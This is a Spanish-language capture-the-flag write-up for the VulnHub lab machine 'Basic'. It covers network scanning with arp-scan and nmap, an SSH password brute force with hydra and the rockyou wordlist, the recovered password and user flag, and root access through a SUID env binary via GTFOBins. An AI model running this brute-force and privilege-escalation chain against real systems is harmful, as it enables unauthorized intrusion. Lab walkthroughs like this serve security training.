## Información

**Nombre máquina:** Basic

**Plataforma:** VulnHub

**Dificultad:** easy

---
## Enumeración

### Arpscan
#### Buscamos la ip victima
```bash
sudo arp-scan -I eth0 --localnet --ignoredups
192.168.1.129	08:00:27:08:1a:35	(Unknown)
```

### Nmap

#### Basic
```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 192.168.1.129

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
80/tcp  open  http    syn-ack ttl 64
631/tcp open  ipp     syn-ack ttl 64
MAC Address: 08:00:27:08:1A:35 (Oracle VirtualBox virtual NIC)
```

> Puertos:22,80,631

#### Específico
```bash

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Test Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
631/tcp open  ipp     CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Inicio - CUPS 2.3.3op2
| http-robots.txt: 1 disallowed entry 
|_/
```

## Paso a paso

#### Puerto 80
Al ir al puerto 80 no tiene nada mas que el index de apache 

#### Puerto 631
 Encontramos una página de impresora. Dándole vueltas encontramos este apartado:
 
![image](https://github.com/user-attachments/assets/225a3268-a8cb-4afd-a9b6-6b0938f75774)

Dándonos el primer user para intentar: dimitri

Hacemos fuerza bruta con hydra al ssh y nos encuentra la pass!

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.129 -I -t 64

[22][ssh] host: 192.168.1.129   login: dimitri   password: mememe
```

entramos y encontramos la primera flag:
```bash
dimitri@basic:~$ ls
user.txt
dimitri@basic:~$ cat user.txt 
f17d2f67c468d15600d8fc0b2ebc1d8c
```

## Escalamos privilegios

hacemos un sudo -l sin éxito, posterior a eso buscamos binarios suid
``` bash
dimitri@basic:~$ find / -perm -4000 2>/dev/null
/usr/bin/env
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

Notamos que el env esta en gtfobins:

![image](https://github.com/user-attachments/assets/c58f7e7f-49c5-43e9-b424-3cccaca5e973)

Aplicamos lo de GTFOBins:

![image](https://github.com/user-attachments/assets/bcaf1894-44fd-4951-ac7e-df1be115bb3d)


![image](https://github.com/user-attachments/assets/f5d86b0c-2361-4c4e-af0e-24f538cbd981)


y **Maquina lista!**


